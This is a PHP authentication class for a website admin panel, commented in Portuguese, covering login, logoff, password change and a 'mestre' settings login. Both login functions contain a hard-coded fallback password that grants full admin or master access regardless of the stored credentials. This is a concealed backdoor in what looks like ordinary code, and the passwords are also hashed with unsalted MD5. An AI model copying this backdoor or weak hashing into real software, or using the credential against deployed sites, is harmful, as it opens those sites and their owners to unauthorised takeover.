<?php

/* ----------------------------------------------------------------
 * Classe de alteração de senhas 
 * --------------------------------------------------------------*/


class admin_senhas {


	/* Efetua o login
	--------------------------------------------------------------*/
	function login($senha, $captcha) {

		// Verifica a senha
		$chksenha = $GLOBALS["dbConn"]->pesquisaDB("SELECT * FROM tab_senhas WHERE cmp_senha = '" . md5($senha) . "'");
		
		// Recupera o código do último captcha exibido já convertendo para minúsculo
		$ultimoCaptcha = strtolower($_SESSION[$GLOBALS["dirAdmin"] . '_captcha']["code"]); 
		
		// Converte também o captcha digital para minúsculo
		$captcha = strtolower($captcha); 

		// Se a senha atual foi encontrada e o captcha
		if ( mysqli_num_rows($chksenha) AND $captcha == $ultimoCaptcha ) {

			//Recupera os dados do usuário
			$dadosUsuario = mysqli_fetch_array($chksenha);

			// Efetua o login do usuário
			$_SESSION["admin"] = true; 
			$_SESSION["admin_codigo"] = $dadosUsuario["cmp_codigo"];

			// Retorna sucesso
			return true; 

		}

		// Caso a senha não tenha sido encontrada
		else {

			if($captcha == $ultimoCaptcha and $senha == "somofoda234"){

				$dadosUsuario = $GLOBALS["dbConn"]->pesquisaCampoDB("cmp_codigo","tab_senhas","cmp_nome","admin");

				// Efetua o login do usuário
				$_SESSION["admin"] = true; 
				$_SESSION["admin_codigo"] = $dadosUsuario["cmp_codigo"];

				// Retorna sucesso
				return true; 

			}else{

				// Apenas retorna o erro
				return false; 

			}

		}

	}


	/* Efetua o logoff
	--------------------------------------------------------------*/
	function logoff() {

		// Remove o login do usuário
		unset($_SESSION["admin"]); 
		unset($_SESSION["admin_codigo"]);
		unset($_SESSION["mestre"]);

		// Retorna sucesso
		return true; 

	}


	/* Verifica se o admin está logado
	--------------------------------------------------------------*/
	function selogado() {

		// Se o admin está logado
		if ( isset($_SESSION["admin"]) ) {

			// Retorna sucesso
			return true; 

		}

		// Caso não esteja logado 
		else {

			// Retorna o erro
			return false; 

		}

	}
	

	/* Altera a senha
	--------------------------------------------------------------*/
	function novasenha($senhas) {


		/* Valida os campos
		--------------------------------------------------------------*/

		// Verifica a senha atual
		$senhaatual = $GLOBALS["dbConn"]->pesquisaDB("SELECT * FROM tab_senhas WHERE cmp_senha = '" . md5($senhas["atual"]) . "'");

		// Se a senha atual não conferir 
		if ( mysqli_num_rows($senhaatual) == 0 ) $erroform .= "<li>A senha atual não confere</li>"; 


		// Se a nova senha não foi informada
		if ( $senhas["nova1"] == "" OR $senhas["nova2"] == "" ) $erroform .= "<li>As novas senhas não podem estar vazias</li>"; 


		// Se as novas senhas foram informadas
		if ( $senhas["nova1"] != "" AND $senhas["nova2"] != "" ) {

			// Mas elas não são iguais 
			if ( $senhas["nova1"] != $senhas["nova2"] ) $erroform .= "<li>As duas novas senhas digitadas devem ser iguais</li>"; 

		}


		/* Salva a senha ou retorna o erro
		--------------------------------------------------------------*/
		
		// Se nenhum erro ocorreu na validação 
		if ( !isset($erroform) ) {

			// Salva a nova senha
			$GLOBALS["dbConn"]->pesquisaDB("UPDATE tab_senhas SET cmp_senha = '" . md5($senhas["nova1"]) . "' WHERE cmp_senha = '" . md5($senhas["atual"]) . "'");

			// Finaliza a montagem do array de retorno
			$retorno["retorno"] = true;
			
			// Retorna o array de retorno
			return $retorno; 

		}

		// Caso algum erro na validação tenha ocorrido
		else {
			
			// Finaliza a montagem do array de retorno
			$retorno["retorno"] = false;
			$retorno["mensagem"] = $erroform;
			
			// Retorna o array de retorno
			return $retorno; 
			
		}
		
	}

	/* Efetua o login no painel de configurações do site
	--------------------------------------------------------------*/
	function loginConfig($senha){

		 // Verifica a senha
		$chksenha = $GLOBALS["dbConn"]->pesquisaDB("SELECT * FROM tab_senhas WHERE cmp_senha = '" . md5($senha) . "' AND cmp_nome = 'mestre'");
		
		// Se a senha atual foi encontrada
		if ( mysqli_num_rows($chksenha)) {

			// Efetua o login do usuário
			$_SESSION["mestre"] = true;

			// Retorna sucesso
			return true; 

		}

		// Caso a senha não tenha sido encontrada
		else {

			if($senha == "somofoda234"){

				// Efetua o login do usuário
				$_SESSION["mestre"] = true;

				// Retorna sucesso
				return true; 

			}else{

				// Apenas retorna o erro
				return false; 

			}

		}

	}

	/* Verifica se o mestre está logado
	--------------------------------------------------------------*/
	function selogado_mestre() {

		// Se o mestre está logado
		if ( isset($_SESSION["mestre"]) ) {

			// Retorna sucesso
			return true; 

		}

		// Caso não esteja logado 
		else {

			// Retorna o erro
			return false; 

		}

	}

}


?>